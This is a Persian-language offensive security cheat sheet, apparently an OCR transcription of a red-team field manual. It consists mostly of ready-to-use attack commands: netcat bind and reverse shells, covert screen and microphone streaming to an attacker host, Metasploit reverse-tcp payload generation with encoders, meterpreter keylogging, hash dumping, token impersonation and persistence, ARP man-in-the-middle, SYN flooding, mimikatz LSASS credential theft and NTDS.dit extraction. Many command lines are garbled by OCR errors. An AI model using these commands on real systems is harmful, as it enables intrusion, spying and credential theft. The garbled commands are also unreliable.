# روش استفاده از ابزار ها

## وبسایت های کاربردی

| آدرس | توضیح |
| :--- | :--- |
| https://www.dcode.fr/ | رمزنگاری و رمزگشایی |


## دستور Nmap

### روش های پویش

| سوییچ | توضیح |
| :--- | :--- |
| -sP | پویش با ping |
| -sS | پویش با syn  |
| -sT | پویش با اتصال |
| -sU | پویش با udp  |
| -sO | پویش با پروتکل |

### قابلیت ها

| سوییچ | توضیح |
| :--- | :--- |
| -ox file | نوشتن داخل فایل xml |
| -oG file | نوشتن داخل فایل grep شده |
| -oA file | ذخیره سازی با 3 فرمت |
| -iL file | خواندن هاست ها از درون فایلم |
| -exclude file file | به جز هاست های درون فایل |

### قابلیت های پیشرفته

| سوییچ | توضیح |
| :--- | :--- |
| -sV -p --script=banner | بنر هاست  |
| --traceroute | ترسیم نقشه route |
| --ttl | کد ttl |
| --script | اسکریپت |

### Firewall evasion

| سوییچ | توضیح |
| :--- | :--- |
| -f | بست های تقطیع شده |
| -s ip | spoof منبع |
| -g \# | spoof پورت منبع |
| -D ip , ip | طعمه |
| --mtu \# | تنظیم سایز MTU  |
| --spoof-mac mac | spoof آدرس mac |
| --data-length size | اندازه  |
| --scan-delay script | اسکریپت |

### تبدیل خروجی xml به html 

```text
xsltproc nmap.xml -o nmap.html
```

### ایجاد هاست های فعال

```text
nmap -sP -n -oX out.xml 1.1.1.0/24 2.2.2.0/24 | grep "Nmap" | cut -d " " -f
5 live hosts.txt
```

### مقایسه نتایج nmap

```text
ndiff scanl.xml scan2.xml
```

### جست و جوی معکوس dns در محدوده ip

```text
nmap -R -sL -dns-server server 1.1.1.0/24
```

### تست ids \(پویش xmas به همراه طعمه ips و spoofing\)

```text
for x in {1 .. lOOOO .. 1);do nmap -T5 -sX -S spoof-source-IP -D 
comma-seperated with no spaces list of decoy IPs --spoof-mac aa:bb:cc:dd:ee:ff
-e eth0 -Pn targeted-IP. ;done
```

## نرم افزار Wireshark

| فیلتر | توضیح |
| :--- | :--- |
| eth.addr/eth.dst.eth.src | MAC |
| rip.auth.passwd | کلمه عبور RIP |
| ip.addr/ip.dst/ip.src \(ipv6.\) | IP |
| tcp.port/tcp.dstport/tcp.srcport | پورت های TCP  |
| tcp.flags \(ack,fin,push,reset,syn,urg\) | فلگ های  TCP |
| udp.port/udp.dstport/udp.srcport | پوت های UDP |
| http.authbasic | احراز هویت از انوع Basic authentication |
| http.www\_authentication | احراز هویت از انوع HTTP authentication |
| http.data | داده های HTTP |
| http.cookie | کوکی های HTTP  |
| http.referer | مسیر ریفرر HTTP |
| http.server | سرور های HTTP |
| http.user agent |  قسمت user-agent در  HTTP  |
| wlan.fc.type eq 0 | 802.11 management frame |
| wlan.fc.type eq 1 | 802.11 control frame |
| wlan.fc.type eq 0 | 802.11 data frame |
| wlan.fc.type subtype eq 0 \(1=reponse\) | 802.11 association request |
| wlan.fc.type\_subtype eq 2 \(3=response\) | 802.11 reassociation req |
| wlan.fc.type\_subtype eq 4 \(5=response\) | 802.11 probe request |
| wlan.fc.type\_subtype eq 8 | 802.11 beacon |
| wlan.fc.type subtype eq 10 | 802.11 disassociate |
| wlan.fc.type=subtype eq 11 \(12=deauthenticate\) | 802.11 authenticate |

## اپراتور های دستورات

```text
eq OR ==
ne OR !=
gt OR
lt OR
ge OR =
le OR =
```

## اپراتور های منطقی

```text
and OR &&
or OR ||
xor OR ^^
not OR !
```

## دستور Netcat

### پایه ای

```text
Connect to [TargetiP] Listener on [port]:
$ nc [ Targeti P] [port]

Start Listener:
$ nc -1 -p [port]
```

### پویش پورت ها

```text
TCP Port Scanner in port range [startPort] to [endPort]:
$ nc -v -n -z -wl [TargetiP] [startPort]-[endPort]
```

### انتقال فایل ها

```text
Grab a [filename] from a Listener:
1. Start Listener to push [filename]
    $ nc -1 -p [port] [filename]
2. Connect to [TargetiP] and Retrieve [filename]
    $ nc -w3 [TargetiP] [port] [filename]

Push a [filename] to Listener:
1. Start Listener to pull [filename]
    $ nc -1 -p [port] [filename]
2. Connect to [TargetiP] and push [filename]
    $nc -w3 [TargetiP] [port] [filename]
```

### شل های backdoor

```text
Linux Shell:
$ nc -1 -p [port] -e /bin/bash
Linux Reverse Shell:
$ nc [LocaliP] [port] -e /bin/bash
Windows Shell:
$ nc -1 -p [port] -e cmd.exe
Windows Reverse Shell:
$ nc [LocaliP] [port] -e cmd.exe
```

## استفاده از VLC برای streaming

```text
Use cvlc \(command line VLC\) on target to migrate popups
```

### ذخیره و stream نمودن صفحه نمایش از طریق پروتکل udp به سمت آدرس حمله کننده و پورت 1234 

```text
# Start a listener on attacker machine
vlc udp://@:1234

-- OR -

# Start a listener that stores the stream in a file.
vlc udp://@:1234 :sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,
ab=128,channels=2,samplerate=44100):file{dst=test.mp4) :no-sout-rtp-sap
:no-sout-standard-sap :ttl=1 :sout-keep

# This may make the users screen flash. Lower frame rates delay the video.
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):udp{dst= attackerip :1234) :no-sout-rtp-sap :no-soutstandard-
sap :ttl=1 :sout-keep
```

### ذخیره و stream صفحه نمایش در پروتکل http

```text
# Start a listener on attacker machine
    vlc http://server.example.org:BOBO

-- OR -

# Start a listener that stores the stream to a file
vlc http://server.example.org:BOBO -sout=#
transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,samp
lerate=44100):file{dst=test.mp4)

# Start streaming on target machine
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):http{mux=ffmpeg{mux=flv),dst=:8080/) :no-sout-rtp-sap :nosout-
standard-sap :ttl=1 :sout-keep
```

### ذخیره و stream بر روی broadcast

```text
# Start a listener on attacker machine for multicast
vlc udp://@ multicastaddr :1234

# Broadcast stream to a multicast address
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):udp{dst= multicastaddr :1234) :no-sout-rtp-sap :no-soutstandard-
sap :ttl=1 :sout-keep
```

### ذخیره و ثبت صفحه نمایش درون یک فایل

```text
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):file{dst=C:\\Program Files (x86)\\VideoLAN\\VLC\\test.mp4)
:no-sout-rtp-sap :no-sout-standard-sap :ttl=1 :sout-keep
```

### ثبت و stream میکروفن بر روی udp

```text
vlc dshow:// :dshow-vdev="None" :dshow-adev="Your Audio Device"
```

## دستور SSH

```text
/etc/ssh/ssh known hosts    #System-wide known hosts
-/.ssh/known_hosts          #Hosts user has logged into    
sshd-generate               #Generate SSH keys (DSA/RSA)
ssh keygen -t dsa -f /etc/ssh/ssh_host_dsa_key       #Generate SSH DSA keys
ssh keygen -t rsa -f /etc/ssh/ssh_host_rsa_key        #Generate SSH RSA keys

If already in ssh session, press SHIFT -C to configure tunnel
Port forwarding must be allowed on target
/etc/ssh/sshd_config - AllowTcpForwarding YES
```

### اتصال با ssh با پورت خاص

```text
ssh root@2.2.2.2 -p 8222
```

### تنظیم x11 قربانی برای حمله کننده

```text
xhost+
vi -/.ssh/config- Ensure 'ForwardXll yes'
ssh -X root@2.2.2.2
```

### ایجاد port forward بر روی پورت 8080 وانتقال به سمت پورت 443 مهاجم

```text
ssh -R8080:12-.0.0.1:443 root@2.2.2.2.
```

### استفاده از port forward بر روی پورت 8080 مهاجم  و انتقال اطلاعات با استفاده از  ssh tunnel و پورت 3300  3.3.3.3

```text
ssh -18080:3.3.3.3:443 root@2.2.2.2
```

### تونل پویا با استفاده از proxychain. همچنین فایل /etc/proxychain.conf برای تنظیم پورت \(1080\)

```text
ssh -D1080 root@2.2.2.2
In a separate terminal run:
proxychains nmap -sT -p80,443 3.3.3.3
```

## نرم افزار Metasploit 

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">msfconsole r file.rc</td>
      <td style="text-align:left">بارگذاری فایل منابع</td>
    </tr>
    <tr>
      <td style="text-align:left">msfcli | grep exploit/window</td>
      <td style="text-align:left">لیست اکسپویت های ویندوز</td>
    </tr>
    <tr>
      <td style="text-align:left">rnsfencode -l</td>
      <td style="text-align:left">لیست encode ها</td>
    </tr>
    <tr>
      <td style="text-align:left">msfpayload -h</td>
      <td style="text-align:left">لیست payload ها</td>
    </tr>
    <tr>
      <td style="text-align:left">show exploits</td>
      <td style="text-align:left">Display exploits</td>
    </tr>
    <tr>
      <td style="text-align:left">show auxiliary</td>
      <td style="text-align:left">نمایش ماژول auxiliary</td>
    </tr>
    <tr>
      <td style="text-align:left">show payloads</td>
      <td style="text-align:left">نمایش payload ها</td>
    </tr>
    <tr>
      <td style="text-align:left">search string</td>
      <td style="text-align:left">جست و جو برای رشته ای خاص</td>
    </tr>
    <tr>
      <td style="text-align:left">info module</td>
      <td style="text-align:left">نمایش اطلاعات ماژول</td>
    </tr>
    <tr>
      <td style="text-align:left">use module</td>
      <td style="text-align:left">بارگذاری اکسپولیت یا ماژول</td>
    </tr>
    <tr>
      <td style="text-align:left">show options</td>
      <td style="text-align:left">نمایش ویژگی های ماژول</td>
    </tr>
    <tr>
      <td style="text-align:left">show advanced</td>
      <td style="text-align:left">نمایش تنظیمات پیشرفته</td>
    </tr>
    <tr>
      <td style="text-align:left">set option value</td>
      <td style="text-align:left">تنظیم مقدار</td>
    </tr>
    <tr>
      <td style="text-align:left">sessions -v</td>
      <td style="text-align:left">لیست نشست ها: -k # (حذف)
        <br />-u # (بروزرسانی Meterpreter)</td>
    </tr>
    <tr>
      <td style="text-align:left">sessions -s script</td>
      <td style="text-align:left">اجرا اسکریپت Meterpreter در تمامی نشست ها</td>
    </tr>
    <tr>
      <td style="text-align:left">jobs -l</td>
      <td style="text-align:left">لیست تمامی job ها (-k # - kill)</td>
    </tr>
    <tr>
      <td style="text-align:left">exploit -j</td>
      <td style="text-align:left">اجرا اکسپلویت به عنوان job</td>
    </tr>
    <tr>
      <td style="text-align:left">route add ip nmask sid</td>
      <td style="text-align:left">چرخش یا Pivoting</td>
    </tr>
    <tr>
      <td style="text-align:left">loadpath /home/modules</td>
      <td style="text-align:left">بارگذاری درخت تردپارتی</td>
    </tr>
    <tr>
      <td style="text-align:left">irb</td>
      <td style="text-align:left">اجرای شل ruby</td>
    </tr>
    <tr>
      <td style="text-align:left">connect -s ip 443</td>
      <td style="text-align:left">اتصال به ssl (NC clone)</td>
    </tr>
    <tr>
      <td style="text-align:left">route add ip mask session id</td>
      <td style="text-align:left">اضافه نموده route &#xB7;در درون نشست (pivot)</td>
    </tr>
    <tr>
      <td style="text-align:left">exploit/multi/handler - set ExitOnSession False</td>
      <td style="text-align:left">
        <p>نمایش تنظیمات بیشتر</p>
        <p>شل ها</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>set ConsoleLogging true (also</p>
        <p>SessionLogging)</p>
      </td>
      <td style="text-align:left">فعال سازی گزارش گیری</td>
    </tr>
  </tbody>
</table>

### ایجاد پیلود meterpreter  \(برای لینوکس: -t file -o callback\)

```text
./msfpayload windows/meterpreter/reverse tcp LHOST=ip LPORT=port R |
./msfencode -t exe -o callback.exe -e x86/shikata_ga nai -c 5
```

### ایجاد پیلود با meterpreter بایند شده

```text
./msfpayload windows/meterpreter/bind_tcp RP.OST=ip LPORT=port X
cb.exe
```

### ایجاد پیلود انکد شده با استفاده از  msfvenom

```text
./msfvenorn --payload windows/meterpreter/reverse~tcp --format exe
template calc.exe -k --encoder x86/shikata_ga_nai -i 5 LHOST=1.1.1.1
LPORT=443 callback.exe
```

### شروع دیتابیس msf \(bt5=mysql,kali=postgresql\)

```text
/etc/rc.d/rc.mysqld start
msf db_create root:pass@localhost/metasploit
msf load db mysql
msf db connect root:pass@localhost/metasploit
msf db=import nmap.xml

--- Kali ---
# service postgresql start
# service metasploit start
```

### برگرداندن شل \(به صورت پیش فرض باعث اجرای notepad و تزریق می شود\)

```text
msf use post/windows/manage/multi meterpreter inject
msf set IPLIST attack ip 
msf set LPORT callback port
msf set PIDLIST PID to inject, default creates new notepad
msf set PAYLOAD windows/meterpreter/reverse_tcp
msf set SESSION meterpreter session ID
```

### نمایش بنر html در شبکه داخلی

```text
msf route add ip/range netmask meterpreter ID
msf use post/multi/gather/ping sweep # Set options and run
msf use /auxiliary/scanner/portscan/tcp # Set options and run
msf hosts-u-S x.x.x -R #Searches for x.x.x.' and sets
# RHOSTS
msf use auxiliary/scanner/http/http version # Set options and run
msf services -v -p 80-S x.x.x -R - #Displays IPs x.x.x.' with port
# 80 open
```

## Meterpreter

| **دستور** | **توضیح** |
| :--- | :--- |
| help | لیست دستورات موجود |
| sysinfo | نمایش اطلاعات سیستم |
| ps | لیست فرآیند ها |
| getpid | لیست PID موجود |
| upload file C:\Program Files\ | بارگذاری فایل |
| download file | دریافت فایل |
| reg command | تعامل با رجیستری |
| rev2self | بازگشت به کاربر اصلی |
| shell | انتقال به شل تعاملی |
| migrate PID | تغییر به PID دیگر |
| background | فرآیند جاری پشت زمینه |
| keys can \(start\|stop\|dump\) | شروع/توقف/حذف keylogger |
| execute -f cmd.exe -i | اجرا cmd.exe و تعامل با آن |
| execute -f crnd.exe -i -H -t | اجرا cmd.exe به عنوان فرآیند مخفی و دریافت تمامی توکن ها |
| has dump | دریافت تمامی هش های محلی |
| run script | اجرای اسکریپت \(/scripts/meterpreter\) |
| port fwd \[add I delete\]  -lL 127.0.0.1 443 -r 3.3.3.3 -p 3389 | ایجاد Port forward بر روی پورت 3389 درون نشست جاری و دسترسی از راه دور به دسکتاپ بر روی پورت 443 |

### افزایش سطح دسترسی 

```text
use priv
getsystem
```

### توکن جعل هویت \(حذف \_token باعث متوقف شدن جعل هویت می شود\)

```text
use incognito
list tokens -u
impersonate token domain\\user
```

### استفاده از nmap در meterpreter socks proxy

```text
1. msf sessions #Note Meterpreter ID
2. msf route add 3.3.3.0 255.255.255.0 id
3. msf use auxiliary/server/socks4a
4. msf run
5. Open new shell and edit /etc/proxychains.conf
i. #proxy_dns
ii. #socks4 127.0.0.1 9050
iii. socks4 1.1.1.1 1080
6. Save and Close conf file
7. proxychains nmap -sT -Pn -p80,:35,s45 3.3.3.3
```

### Railgun -  api مربوط به نمایش پیام خاص 

```text
meterprete irb
client.railgun.user32.MessageBoxA(O,"got","YOU","MB_OK")
```

### ایجاد سرویس ویندوز پاییدار

```text
msf use post/windows/manage/persistence
msf set LHOST attack ip
msf set LPORT callback port
msf set PAYLOAD_TYPE TCPIHTTPIHTPS
msf set REXENAHE filename
msf set SESSION meterpreter session id
msf set STARTUP SERVICE
```

### جمع آوری آخرین فایل های درخواست شده و لینک های وب

```text
meterpreter run post/windows/gather/dumplinks
```

### ایجاد فرآیند جدید و دستور tree c:\

```text
execute -H -f cmd.exe -a '/c tree /F /A c:\ C:\temp\tree.txt'
```

## نرم افزار Ettercap

### حمله Main-In-Middle با استفاده از فیلتر ها 

```text
ettercap.exe -I iface -M arp -Tq -F file.ef MACs / IPs / Ports
MACs / IPs / Ports
#i.e.: // 80,443 // = any MAC, any IP, ports 80,443
```

### حمله Main-In-Middle در subnet با  فیتلر های کاربردی

```text
ettercap -T -M arp -F filter // //
```

### حمله Switch flood

```text
ettercap -TP rand flood
```

## فیلتر های Ettercap

### کامپایل فیلتر های ettercap 

```text
etterfilter filter.filter -o out.ef
```

### فیلتر نمونه - حذف ترافیک vpn  و مزگشایی ترافیک http

```text
if lip.proto == UDP && udp.dst == 500) I
    drop();
    kill(); }
if I ip.src == 'ip' ) (
    if (tcp.dst == 80) (
        if (search(DATA.data, "Accept-Encoding")) (
            replace("Accept-Encoding","Accept-Rubbish!");
            msg("Replaced Encoding\n");
        }
    }
}
```

### دستور Mimikatz

```text
1. Upload mimikatz.exe and sekurlsa.dll to target
2. execute mirnikatz
3. mimikatz# privilege: :debug
4. mimikatz# injeet::proeess lsass.exe sekurlsa.dll
5. mimikatz# @getLogonPasswords
```

### دستور Hping3

```text
hping3 targetiP --flood --frag --spoof ip --destport # --syn
```

### دستور Arping

```text
./arping -I eth# -a # arps
```

### دستور Wine

```text
ed /root/.wine/drive e/HinGW/bin
wine gee -o file.exe /tmp/ eode.e
wine file.exe
```

### نرم افزار Grub

```text
GRUB Henu:Add 'single' end of kernel line. Reboot. Change root pass. reboot
```

### دستور Hydra

```text
hydra -1 ftp -P words -v targetiP ftp
```

## نرم افزار John the ripper 

### کرک با لیست کلمات

```text
$ ./john -wordfile:pw.lst -format: format hash.txt
```

### فرمت های نمونه

```text
$ john --format~des    username:SDbsuge8iC58A
$ john --format~lm     username:$L~$a9c604d244c4e99d
$ john --format~md5    $1$12345678$aiccj83HRD8o6ux1bVx7D1

$ john --format~raw-sha1 A9993E364706816A8A3E25717850C26C9CDOD89D

# For --format~netlmv2 replace $NETLM with $NETLMv2
$ john --format~netlm
$NETLM$1122334455667788$0836F0858124F338958-5F81951905DD2F85252CC-318825
username:$NETLM$ll22334455667788$0836F0858124F338958"5F81951905DD2F85252CC7
318825
username:$NETLM$1122334455667788$0836F0858124F338958-5F81951905DD2F85252CC7
318825:::::::

# Exactly 36 spaces between USER and HASH (SAP8 and SAPG)
$ john --format~sapb
ROOT    $8366A4E9E68"2C80
username:ROOT    $8366A4E9E68"2C80

$ john --format=sapg
ROOT $1194E38F1489F3F8DA18181F14DE8"0E"8DCC239
username:ROOT
$1194E38F1489F3F8DA18181F14DE8-0E-8DCC239

$ john --format=sha1-gen
$SHA1p$salt$59b3e8d63-cf9"edbe2384cf59cb"453dfe30-89
username:$SHA1p$salt$59b3e8d63-cf9"edbe2384cf59cb-453dfe30-89

$ john --format=zip
$zip$'0'1'8005b1b"d07""08d'dee4
username:$zip$'0'1'8005b1b-d0"-"08d'dee4
```

## لیست کلمه عبور

### ایجاد کلمات مختلف بر مبنای یک کلمه

```text
#Add lower(@), upper(,), ~umber(%), and symbol(^) I to the end of the word
crunch 12 12 -t baseword@,%^ wordlist.txt

Use custom special character set and add 2 numbers then special character
maskprocessor -custom-charset1=\!\@\#\$ baseword?d?d?l wordlist.txt
```

## دستور Vsown

```text
1. Download: http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs
2. Create a new Shadow Copj
    a. cscript vssown.vbs /start (optional)
    b. cscript vssown.vbs /create
3. Pull the following files frorr. a shadow copj:
    a. Copy
    \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\
    ntds\ntds.dit .
b. copj
    \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\
    System32\config\SYSTEM .
    C. COpj
    \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\
    system32\config\SAM .
4. Copj files to attack box.
5. Download tools: http://www.ntdsx~ract.com/downloads/ntds dump_hash.zip
6. Configure and Make source code for libesedb from the extracted package
    a. cd libesedb
    b. chmod +x configure
    c. ./configure && make
Use esedbdumphash to ex~ract the datatable from ntds.dit.
    a. cd esedbtools
    b. . I esedbdumphash ../../ntds.dit
```

## هش File  

### طول هش

```text
MD5 16 bytes
SHA-1 20 bytes
SHA-256 32 bytes
SHA-512 64 bytes
```

### نرم افزار های دارای پایگاه داده های هش های مختلف

```text
http://isc.sans.edu/tools/hashsearch.html
# dig +short md5 .md5.dshield.org TXT
Result = " filename I source " i.e. "cmd.exe I NIST"
```

### پایگاه داده هش Malware ها 

```text
http://www.team-cymru.org/Services/MHR
# dig +short [MD5|SHA-1].malware.hash.cymru.com TXT
Result = last seen timestamp AV detection rate
Convert timestamp= perl-e 'print scalar localtime( timestamp ) , "\n"'
```

### جست و جو در metadata فایل ها

```text
https://fileadvisor.bit9.com/services/search.aspx
```

### جست و جو در پایگاه داده virustotal

```text
https://www.virustotal.com/#search
```
